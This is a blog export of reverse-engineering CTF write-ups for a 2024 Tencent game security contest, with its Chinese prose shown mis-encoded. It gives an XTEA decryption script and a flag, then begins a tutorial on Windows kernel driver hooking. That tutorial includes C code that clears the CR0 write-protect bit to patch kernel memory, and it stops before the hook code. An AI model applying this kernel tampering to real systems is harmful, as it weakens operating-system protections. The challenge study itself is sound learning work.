<p>å…ˆç”¨DriverViewè¾…åŠ©è®¡ç®—ä¸‹æ–­ç‚¹çš„è™šæ‹Ÿå†…å­˜ æ–­ç‚¹å°±ä¸‹åœ¨<code>ProbeForRead </code>å¤„ å› ä¸ºè¿™ä¸ªå‡½æ•°æ˜¯é©±åŠ¨è·å–ç”¨æˆ·å†…å­˜çš„API:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F28%2F20250328-172317.png" alt="image-20250328172317640"></p>
<p>å¾—åˆ°è¿™ä¸¤ä¸ªå‡½æ•°éƒ½ç”¨äºå®ç°æ•°æ®ä»ç”¨æˆ·å±‚è¿ç§»åˆ°é©±åŠ¨å±‚:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F28%2F20250328-173322.png" alt="image-20250328173322530"></p>
<p>éšååœ¨è¯»åˆ°é©±åŠ¨å±‚çš„æ•°æ®ä¸Šä¸‹ç¡¬ä»¶æ–­ç‚¹è·Ÿè¸ªæ•°æ®æµå‘ å‘ç°æ¥åˆ°äº†å¦‚ä¸‹çš„å‡½æ•° å‚æ•°å°±æ˜¯ç”¨æˆ·å±‚å®ŒæˆåŠ å¯†åçš„å‰ä¸¤ä¸ªå­—èŠ‚ä»¥åŠbâ€™ACE6â€™:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F28%2F20250328-174036.png" alt="QQ_1743154801365"></p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F28%2F20250328-174056.png" alt="image-20250328174056789"></p>
<p>åœ¨IDAä¸­æ‰¾åˆ°å¯¹åº”å‡½æ•°è¿›è¡Œé™æ€åˆ†æ:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F28%2F20250328-174134.png" alt="image-20250328174134180"></p>
<p>å‘ç°å°±æ˜¯ä¸€ä¸ªXTEA æœ¬æ¥æ‰“ç®—ç›´æ¥è¿è¡Œæ¥éªŒè¯å…¶æ˜¯å¦æ¯æ¬¡ä¼ å…¥çš„éƒ½æ˜¯ç›¸é‚»ä¸¤ä¸ªå­—èŠ‚çš„ç”¨æˆ·å±‚åŠ å¯†ç»“æœ ä½†æ˜¯æ–­ç‚¹æ²¡æœ‰è¢«å‡»ä¸­ç¬¬äºŒæ¬¡ çŒœæµ‹åº”è¯¥æ˜¯åœ¨åŠ å¯†å®Œåç›´æ¥å°±ä¸æ­£ç¡®å¯†æ–‡è¿›è¡Œäº†å¯¹æ¯”ç›´æ¥é€€å‡º è¿™ä¸€æ¬¡è°ƒè¯•å°è¯•ä½¿ç”¨æ­¥è¿‡æ¥æŸ¥çœ‹ç»“æœ:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F28%2F20250328-175404.png" alt="img"></p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F28%2F20250328-175408.png" alt="image-20250328175408664"></p>
<p>é€šè¿‡RSIè®¡ç®—æ˜¯ä»å“ªé‡Œå–å‡ºçš„ä¸TEAç»“æœå¯¹æ¯”çš„ è®¡ç®—åç§»ä¸º0x4060:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F28%2F20250328-175524.png" alt="image-20250328175524796"></p>
<p>ä¹Ÿå°±æ˜¯è¯´è¿™ä¸€å—åº”è¯¥å­˜æ”¾çš„å°±æ˜¯æœ€ç»ˆçš„å¯†æ–‡</p>
<p>æ‰‹åŠ¨ä¿®æ”¹zfå¯„å­˜å™¨å€¼å¤šè§‚å¯Ÿå‡ è½® <code>r @zf=1</code> éšåå¤åˆ¶IDAä¼ªä»£ç éªŒè¯æ˜¯å¦å°±æ˜¯TEAåŠ å¯† å‘ç°ç»“æœå’Œå†…æ ¸è°ƒè¯•è¿‡ç¨‹ä¸­å¾—åˆ°çš„ä¸ä¸€æ · å¯¹TEAäº¤å‰å¼•ç”¨å‘ç°æœ‰å‡½æ•°å¯¹å…¶å†…å®¹è¿›è¡Œäº†ä¿®æ”¹:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F28%2F20250328-180550.png" alt="image-20250328180550821"></p>
<p>åœ¨WinDBGä¸­æ‰¾åˆ°TEAå‡½æ•°å¯¹åº”çš„ä½ç½®æ‹·è´å…¶å†…å­˜åˆ°IDAä¸­è¿›è¡Œpatchçœ‹çœ‹ç»“æœ</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F28%2F20250328-181250.png" alt="QQ_1743156768453"></p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F28%2F20250328-181253.png" alt="image-20250328181253336"></p>
<p>å‘ç°TEAå‡½æ•°è¢«æ”¹ä¸ºäº†è·³åˆ°æŸä¸ªåœ°å€ åœ¨è¿™ä¸ªåœ°å€ä¸‹æ–­çœ‹çœ‹åšäº†ä»€ä¹ˆ:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F28%2F20250328-181631.png" alt="QQ_1743156984996"></p>
<p>å¤§è‡´å¯ä»¥çœ‹å‡ºæ¥ä¹Ÿæ˜¯ç±»ä¼¼TEAçš„ä¸­é—´æ“ä½œ æŒ‡ä»¤æ¡æ•°å®é™…ä¸Šå¹¶ä¸æ˜¯å¾ˆå¤š å¯ä»¥åœ¨IDAä¸­æ‰¾ä¸€å—å†…å­˜å°†å…¶patchæˆTEAè·³è½¬åˆ°çš„è¿™å—æŒ‡ä»¤ç„¶åå†ä¿®æ”¹TEA+0x56å¤„çš„é€»è¾‘è®©å…¶è·³åˆ°è‡ªå·±æ‰‹å†™çš„æŒ‡ä»¤ä¸Šæœ€ååº”è¯¥å°±èƒ½è®©IDAåæ±‡ç¼–å‡ºå®é™…æ‰§è¡Œçš„æŒ‡ä»¤äº†(ä¸ºäº†æ–¹ä¾¿å†™å…¥æŒ‡ä»¤ å°†ç¨‹åºåŸºå€rebaseæˆäº†0):</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F28%2F20250328-183524.png" alt="QQ_1743158119488"></p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F28%2F20250328-183606.png" alt="QQ_1743158161787"></p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F28%2F20250328-183624.png" alt="QQ_1743158182514"></p>
<p>ç»è¿‡æµ‹è¯•æˆåŠŸè¿ç®—å‡ºäº†è°ƒè¯•æ—¶å¾—åˆ°çš„ç»“æœ:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F28%2F20250328-184330.png" alt="QQ_1743158606986"></p>
<h2 id="ç¼–å†™è§£å¯†è„šæœ¬"><a href="#ç¼–å†™è§£å¯†è„šæœ¬" class="headerlink" title="ç¼–å†™è§£å¯†è„šæœ¬"></a>ç¼–å†™è§£å¯†è„šæœ¬</h2><p>æ¥ä¸‹æ¥è¦åšçš„å°±æ˜¯ç¼–å†™è„šæœ¬è§£å¯†äº†:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* r0å±‚åŠ å¯†ä½¿ç”¨çš„key: */</span></span><br><span class="line"><span class="type">int</span> key[<span class="number">4</span>] = &#123;<span class="number">0x41</span>, <span class="number">0x43</span>, <span class="number">0x45</span>, <span class="number">0x36</span>&#125;;</span><br><span class="line"><span class="comment">/* r3å±‚åŠ å¯†ä½¿ç”¨çš„key: */</span></span><br><span class="line"><span class="type">char</span> key2[] = <span class="string">&quot;sxx\x00&quot;</span>;</span><br><span class="line"><span class="comment">/* r0å±‚å¾—åˆ°çš„å¯†æ–‡: */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> to_decrypt[<span class="number">42</span>] = &#123;</span><br><span class="line">    <span class="number">0x0EC367B8</span>, <span class="number">0xC9DA9044</span>, <span class="number">0xDA6C2DEB</span>, <span class="number">0x88DDC9C3</span>, <span class="number">0x32A01575</span>, <span class="number">0x231DD0B4</span>, <span class="number">0x4B9E8A74</span>, <span class="number">0xD75D3E74</span>, </span><br><span class="line">    <span class="number">0xEAAB8712</span>, <span class="number">0xE704E888</span>, <span class="number">0xE01A31AC</span>, <span class="number">0xECAE205C</span>, <span class="number">0xA7BE7467</span>, <span class="number">0x0C6252A3</span>, <span class="number">0x1AEFEC4E</span>, <span class="number">0xC40DED44</span>, </span><br><span class="line">    <span class="number">0xC3C842CC</span>, <span class="number">0xDE4A0C0E</span>, <span class="number">0x7C24F3FC</span>, <span class="number">0x8FB8D001</span>, <span class="number">0x11153E6E</span>, <span class="number">0x530ED15C</span>, <span class="number">0xF4214811</span>, <span class="number">0xBEB517E0</span>, </span><br><span class="line">    <span class="number">0x63F91634</span>, <span class="number">0x4D96F8A5</span>, <span class="number">0xFE23EAC8</span>, <span class="number">0x2C607ADF</span>, <span class="number">0xCC43D85C</span>, <span class="number">0xFF186C5B</span>, <span class="number">0x8763E1A5</span>, <span class="number">0x9187BD58</span>, </span><br><span class="line">    <span class="number">0x87D1069B</span>, <span class="number">0xD7878D7B</span>, <span class="number">0x836E6B68</span>, <span class="number">0x55A0C63F</span>, <span class="number">0xD979FDB3</span>, <span class="number">0x3E524DEE</span>, <span class="number">0x7AB35C82</span>, <span class="number">0xA2F4DA8D</span>, </span><br><span class="line">    <span class="number">0x1708BA4C</span>, <span class="number">0x710653E6</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* XTEAè§£å¯†å‡½æ•° */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">XTEA_decrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> * to_decrypt)</span></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v1 = to_decrypt[<span class="number">0</span>], v2 = to_decrypt[<span class="number">1</span>], v3 = key[<span class="number">0</span>], v5 = key[<span class="number">1</span>], delta = <span class="number">0x61C88647</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> sum = delta * (<span class="number">-32</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> _ = <span class="number">0</span>; _ &lt; <span class="number">32</span>; _++)&#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> tmp = sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>];</span><br><span class="line">        v2 -= tmp ^ (v1 + ((<span class="number">16</span> * v1) ^ (v1 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">        v1 -= (sum + v2) ^ (v3 + <span class="number">16</span> * v2) ^ (v5 + (v2 &gt;&gt; <span class="number">5</span>));</span><br><span class="line">        sum += delta;</span><br><span class="line">    &#125;</span><br><span class="line">    to_decrypt[<span class="number">0</span>] = v1;</span><br><span class="line">    to_decrypt[<span class="number">1</span>] = v2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i += <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">XTEA_decrypt</span>(to_decrypt + i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%#08x, &quot;</span>, to_decrypt[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i++)&#123;</span><br><span class="line">        to_decrypt[i] ^= key2[i % <span class="number">3</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, to_decrypt[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å°†å¾—åˆ°çš„å­—ç¬¦ä¸²åè½¬å¹¶b58decodeåæ‹¼æ¥<code>ACE_</code>:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">b58decode</span>(<span class="params">cipher_input : <span class="built_in">bytes</span></span>):</span><br><span class="line">    alphabet = <span class="string">b&#x27;abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ123456789&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> cipher_input[-<span class="number">1</span>] == <span class="string">b&#x27;@&#x27;</span>[<span class="number">0</span>]:</span><br><span class="line">        cipher_input = cipher_input[:-<span class="number">1</span>]</span><br><span class="line">    base = <span class="built_in">len</span>(alphabet)</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> cipher_input:</span><br><span class="line">        num = num * base + alphabet.index(char)</span><br><span class="line">    <span class="keyword">return</span> num.to_bytes((num.bit_length() + <span class="number">7</span>) // <span class="number">8</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line">to_decode = <span class="string">b&#x27;@PksUn39kYj763ggA1HLBUCaWSZv4vs4CwSevAnQEs&#x27;</span>[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ACE_&#x27;</span> + b58decode(to_decode).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>



<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F28%2F20250328-212850.png" alt="img"></p>
<p>å¾—åˆ°flag: <code>ACE_We1C0me!T0Z0Z5GamESecur1t9*CTf</code></p>
<p>éªŒè¯flag:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F28%2F20250328-211247.png" alt="QQ_1743167529693"></p>
]]></content>
      <categories>
        <category>äºŒè¿›åˆ¶</category>
        <category>Reverse</category>
        <category>Windowså†…æ ¸</category>
      </categories>
      <tags>
        <tag>Reverse</tag>
        <tag>Writeups</tag>
        <tag>Kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>è·Ÿç€2024å¹´è…¾è®¯æ¸¸æˆå®‰å…¨ç«èµ›(å†³èµ›(å‰3é—®))ä»é›¶å¼€å§‹å­¦Windowså†…æ ¸é©±åŠ¨Hook</title>
    <url>/2025/04/10/%E8%B7%9F%E7%9D%802024%E5%B9%B4%E8%85%BE%E8%AE%AF%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%86%B3%E8%B5%9B-%E5%89%8D3%E9%97%AE-%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6Windows%E5%86%85%E6%A0%B8%E9%A9%B1%E5%8A%A8Hook/</url>
    <content><![CDATA[<p>è®°å½•ä¸€ä¸‹ç¬¬ä¸€æ¬¡æ·±å…¥é©±åŠ¨å±‚hookå­¦åˆ°çš„ä¸œè¥¿</p>
<span id="more"></span>

<p>é¢˜ç›®ç»™äº†ä¸€ä¸ªé©±åŠ¨å’Œå†™äº†<code>username-key</code>çš„æ–‡æœ¬ è¦æ±‚å°†æ–‡æœ¬æ”¾åœ¨<code>C:\</code>ä¸‹å¹¶æ‰‹åŠ¨åŠ è½½é©±åŠ¨</p>
<h2 id="åˆ›å»ºå¹¶å¯ç”¨å†…æ ¸é©±åŠ¨"><a href="#åˆ›å»ºå¹¶å¯ç”¨å†…æ ¸é©±åŠ¨" class="headerlink" title="åˆ›å»ºå¹¶å¯ç”¨å†…æ ¸é©±åŠ¨"></a>åˆ›å»ºå¹¶å¯ç”¨å†…æ ¸é©±åŠ¨</h2><p>è¿™é‡Œä½¿ç”¨Windowsè‡ªå¸¦çš„sc.exeæ¥åŠ è½½ ä½¿ç”¨</p>
<p><code>sc create [Service name] binpath=&quot;\path\to\driver type=kernel start=[Way to start]&quot;</code></p>
<p>æ¥åŠ è½½ä¸€ä¸ªé©±åŠ¨æœåŠ¡ éœ€è¦æŒ‡å®šæœåŠ¡å é©±åŠ¨è·¯å¾„ å¯åŠ¨æ–¹å¼</p>
<p>å¯åŠ¨æ–¹å¼æœ‰:</p>
<p>â€¢ <code>demand</code>: éœ€è¦æ‰‹åŠ¨å¯ç”¨<br>â€¢ <code>boot</code>: ç³»ç»Ÿå¯åŠ¨æ—¶åŠ è½½<br>â€¢ <code>system</code>: å†…æ ¸åˆå§‹åŒ–æ—¶åŠ è½½<br>â€¢ <code>auto</code>: è‡ªåŠ¨å¯åŠ¨<br>â€¢ <code>disabled</code>: ç¦ç”¨</p>
<p>è¿™é‡Œé€‰æ‹©ä½¿ç”¨æ‰‹åŠ¨å¯ç”¨æ¥åˆ¶é€ hookæ—¶æœº:</p>
<p><code>sc start ACE2024</code></p>
<p>scè¿˜æœ‰å…¶ä»–å‡ ä¸ªæŒ‡ä»¤:</p>
<table>
<thead>
<tr>
<th align="left">å‘½ä»¤</th>
<th align="left">åŠŸèƒ½</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>sc query ACE2024</code></td>
<td align="left">æŸ¥è¯¢æœåŠ¡çŠ¶æ€</td>
</tr>
<tr>
<td align="left"><code>sc stop ACE2024</code></td>
<td align="left">åœæ­¢æœåŠ¡ (å¸è½½é©±åŠ¨)</td>
</tr>
<tr>
<td align="left"><code>sc delete ACE2024</code></td>
<td align="left">åˆ é™¤æœåŠ¡ (éœ€å…ˆåœæ­¢)</td>
</tr>
<tr>
<td align="left"><code>sc config ACE2024 start= auto</code></td>
<td align="left">ä¿®æ”¹æœåŠ¡ä¸ºè‡ªåŠ¨å¯åŠ¨</td>
</tr>
</tbody></table>
<h2 id="IDAâ€¦æ— æ³•é™æ€åˆ†æ"><a href="#IDAâ€¦æ— æ³•é™æ€åˆ†æ" class="headerlink" title="IDAâ€¦æ— æ³•é™æ€åˆ†æ"></a>IDAâ€¦æ— æ³•é™æ€åˆ†æ</h2><p>é©±åŠ¨æœ¬ä½“å°±æœ‰10mb IDAæ‰“å¼€åå¯ä»¥çœ‹åˆ°é©±åŠ¨å…¥å£ä¹‹åéƒ½è¢«æ··æ·†äº† å¹¶ä¸”åç»­IDAä¸€ç›´åœ¨åŠ è½½ä¸çŸ¥é“ä»€ä¹ˆä¸œè¥¿ è€Œä¸”çœ‹èµ·æ¥åƒæŠ¥é”™:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F04%2F10%2F20250410-172218.png" alt="QQ_1744276810321"></p>
<p>å¯¼è‡´IDAå¾ˆå¡ æ‰€ä»¥åé¢éƒ½ä¼šç”¨<code>Binaryninja</code>æ¥è¿›è¡Œé™æ€åˆ†æ</p>
<h2 id="å†…æ ¸é©±åŠ¨çš„hook"><a href="#å†…æ ¸é©±åŠ¨çš„hook" class="headerlink" title="å†…æ ¸é©±åŠ¨çš„hook"></a>å†…æ ¸é©±åŠ¨çš„hook</h2><p>å› ä¸ºä»£ç çš„æ··æ·† ç¡¬çœ‹åŸºæœ¬ä¸Šçœ‹ä¸å‡ºé€»è¾‘ è¿™ä¸ªæ—¶å€™å°±åº”è¯¥ä½¿ç”¨hookæŠ€æœ¯äº† è€Œåœ¨è¿™é¢˜ä¸­ ä¸€ä¸ªå†…æ ¸é©±åŠ¨è¦è¯»å–æ–‡ä»¶å†…å®¹å¤§æ¦‚ç‡è¦ä½¿ç”¨<code>NtReadFile()</code>å’Œ<code>NtCreateFile()</code> æ‰€ä»¥è¿™ä¸¤ä¸ªå‡½æ•°å°±æ˜¯æˆ‘ä»¬hookçš„ç›®æ ‡</p>
<h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>å‚è€ƒ<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/gettingstarted/writing-a-very-small-kmdf--driver">å¾®è½¯çš„å†…æ ¸é©±åŠ¨ç¼–å†™æ•™ç¨‹</a> VSéœ€è¦å®‰è£…ä»¥ä¸‹ç»„ä»¶:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F04%2F10%2F20250410-220315.png" alt="QQ_1744293792629"></p>
<p>æ¥ä¸‹æ¥å®‰è£…ç›¸åŒç‰ˆæœ¬çš„<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/other-wdk-downloads">WDK</a>å’Œ<a href="https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/">WSDK</a> å®‰è£…è¿™ä¸ªç‰ˆæœ¬çš„WDK å…¶ä»–çš„ä¸ä¿è¯èƒ½æ­£å¸¸ç¼–è¯‘é©±åŠ¨:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F04%2F10%2F20250410-220534.png" alt="QQ_1744293906177"></p>
<h3 id="ç»•è¿‡PatchGuard"><a href="#ç»•è¿‡PatchGuard" class="headerlink" title="ç»•è¿‡PatchGuard"></a>ç»•è¿‡PatchGuard</h3><p>è€Œ64ä½Windowsé©±åŠ¨æœ‰å†…æ ¸ä¿æŠ¤(PatchGuard) æ­£å¸¸æƒ…å†µä¸‹ä¸ä¼šå…è®¸é©±åŠ¨ä¿®æ”¹å†…å­˜ è¿™æ—¶å€™å°±è¦é€šè¿‡ä¸€äº›æ‰‹æ®µæ¥ç»•è¿‡è¿™ä¸ªä¿æŠ¤äº†</p>
<p>è¿™é‡Œå‚è€ƒ<a href="https://xia0ji233.pro/2024/04/22/tencent-race-2024-pre-final/index.html">è¿™ä½å¤§ä½¬çš„åšå®¢</a> é€šè¿‡ä»¥ä¸‹ä¸¤ä¸ªå‡½æ•°å¼€å…³PG:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">KIRQL <span class="title function_">writeProtectOFFx64</span><span class="params">()</span> &#123;</span><br><span class="line">    KIRQL OldIrql;</span><br><span class="line">    OldIrql = KeRaiseIrqlToDpcLevel();</span><br><span class="line">    __writecr0(__readcr0() &amp; ~<span class="number">0x10000</span>);</span><br><span class="line">    _disable();</span><br><span class="line">    <span class="keyword">return</span> OldIrql;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">writeProtectONx64</span><span class="params">(KIRQL OldIrql)</span> &#123;</span><br><span class="line">    _enable();</span><br><span class="line">    __writecr0(__readcr0() | <span class="number">0x10000</span>);</span><br><span class="line">    KeLowerIrql(OldIrql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä»¥ä¸‹æ˜¯å¯¹ä¸Šè¿°ä»£ç çš„è§£é‡Š</p>
<table>
<thead>
<tr>
<th align="left">ä»£ç </th>
<th align="left">ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>KeRaiseIrqlToDpcLevel()</code></td>
<td align="left">å°†å½“å‰å¤„ç†å™¨ä¸­æ–­è¯·æ±‚çº§åˆ«(IRQL)æå‡è‡³ <code>DISPATCH_LEVEL</code>(DPC çº§åˆ«) é˜²æ­¢çº¿ç¨‹åˆ‡æ¢å¹²æ‰°</td>
</tr>
<tr>
<td align="left"><code>__readcr0() &amp; ~0x10000</code></td>
<td align="left">è¯»å– <code>CR0</code> å¯„å­˜å™¨å¹¶æ¸…é™¤ç¬¬ 16 ä½(WP ä½) ç¦ç”¨å†…å­˜å†™ä¿æŠ¤</td>
</tr>
<tr>
<td align="left"><code>__writecr0(...)</code></td>
<td align="left">å°†ä¿®æ”¹åçš„å€¼å†™å› <code>CR0</code> å¯„å­˜å™¨</td>
</tr>
<tr>
<td align="left"><code>_disable()</code></td>
<td align="left">æ‰§è¡Œ <code>CLI</code> æŒ‡ä»¤ç¦ç”¨å¤„ç†å™¨ä¸­æ–­ é˜²æ­¢ä¸­æ–­ä¸Šä¸‹æ–‡ç ´åå…³é”®æ“ä½œ</td>
</tr>
</tbody></table>
<p>æ¥ä¸‹æ¥å°±èƒ½è¿›è¡Œå¯¹ä¸Šè¿°ä¸¤ä¸ªå†…æ ¸å‡½æ•°çš„hookäº† å…ˆå°è¯•ä½¿ç”¨æœ€ç®€å•çš„ inline hoook</p>
<h3 id="å¯¹å†…æ ¸å‡½æ•°è¿›è¡Œinline-hook"><a href="#å¯¹å†…æ ¸å‡½æ•°è¿›è¡Œinline-hook" class="headerlink" title="å¯¹å†…æ ¸å‡½æ•°è¿›è¡Œinline hook"></a>å¯¹å†…æ ¸å‡½æ•°è¿›è¡Œinline hook</h3><p>è¢«åŠ è½½åˆ°å†…æ ¸çš„é©±åŠ¨å…±ç”¨APIæ¨¡å— æˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨ç¼–å†™çš„é©±åŠ¨ä¸­é€šè¿‡å‡½æ•°åè·å–åˆ°å…¶åœ°å€ æ¥ä¸‹æ¥çš„å…³é”®å°±æ˜¯å¦‚ä½•åˆ¤åˆ«è¯»å–çš„æ–‡ä»¶æ˜¯å¦æ˜¯<code>\??\C:card.txt</code>äº† é€šè¿‡<a href="https://ntdoc.m417z.com/">è¿™ä¸ªç½‘ç«™</a>æ¥æŸ¥æ‰¾è¦hookçš„å†…æ ¸å‡½æ•°çš„ä¿¡æ¯</p>
<p><code>NtCreateFile()</code>çš„åŸå‹:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">NTSYSCALLAPI</span><br><span class="line">NTSTATUS</span><br><span class="line">NTAPI</span><br><span class="line"><span class="title function_">NtCreateFile</span><span class="params">(</span></span><br><span class="line"><span class="params">    _Out_ PHANDLE FileHandle,</span></span><br><span class="line"><span class="params">    _In_ ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">    _In_ PCOBJECT_ATTRIBUTES ObjectAttributes,</span></span><br><span class="line"><span class="params">    _Out_ PIO_STATUS_BLOCK IoStatusBlock,</span></span><br><span class="line"><span class="params">    _In_opt_ PLARGE_INTEGER AllocationSize,</span></span><br><span class="line"><span class="params">    _In_ ULONG FileAttributes,</span></span><br><span class="line"><span class="params">    _In_ ULONG ShareAccess,</span></span><br><span class="line"><span class="params">    _In_ ULONG CreateDisposition,</span></span><br><span class="line"><span class="params">    _In_ ULONG CreateOptions,</span></span><br><span class="line"><span class="params">    _In_reads_bytes_opt_(EaLength) PVOID EaBuffer,</span></span><br><span class="line"><span class="params">    _In_ ULONG EaLength</span></span><br><span class="line"><span class="params">    )</span>;</span><br></pre></td></tr></table></figure>

<p>è€Œè¦å¾—åˆ°çš„æ–‡ä»¶å¥æŸ„æ¥è‡ª<code>ObjectAttributes-&gt;ObjectName-&gt;Buffer</code>è·¯å¾„çš„æ–‡ä»¶ æ‰€ä»¥è¿™é‡Œå°±é€šè¿‡å¯¹è¿™ä¸ªå‚æ•°æ¥åˆ¤æ–­æ˜¯å¦è¦æ‰“å¼€card.txt</p>
<p>åŒæ—¶æˆ‘ä»¬å°±å¯ä»¥ä¿ç•™<code>FileHandle</code>æ¥ä¸ºæœªæ¥hook <code>NtReadFile()</code>åšå‡†å¤‡</p>
<p><code>NtReadFile()</code>çš„åŸå‹:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">NTSYSCALLAPI</span><br><span class="line">NTSTATUS</span><br><span class="line">NTAPI</span><br><span class="line"><span class="title function_">NtReadFile</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ HANDLE FileHandle,</span></span><br><span class="line"><span class="params">    _In_opt_ HANDLE Event,</span></span><br><span class="line"><span class="params">    _In_opt_ PIO_APC_ROUTINE ApcRoutine,</span></span><br><span class="line"><span class="params">    _In_opt_ PVOID ApcContext,</span></span><br><span class="line"><span class="params">    _Out_ PIO_STATUS_BLOCK IoStatusBlock,</span></span><br><span class="line"><span class="params">    _Out_writes_bytes_(Length) PVOID Buffer,</span></span><br><span class="line"><span class="params">    _In_ ULONG Length,</span></span><br><span class="line"><span class="params">    _In_opt_ PLARGE_INTEGER ByteOffset,</span></span><br><span class="line"><span class="params">    _In_opt_ PULONG Key</span></span><br><span class="line"><span class="params">    )</span>;</span><br></pre></td></tr></table></figure>

<p>åªéœ€è¦å¯¹æ¯”<code>FileHandle</code>å’Œè‡ªå·±ä¿å­˜çš„æ–‡ä»¶å¥æŸ„å°±èƒ½åˆ¤æ–­æ˜¯å¦è¯»å–card.txtäº†</p>
<p>ä»¥ä¸‹å°±æ˜¯hookè¿™ä¸¤ä¸ªå†…æ ¸å‡½æ•°çš„ç›¸å…³ä»£ç :</p>
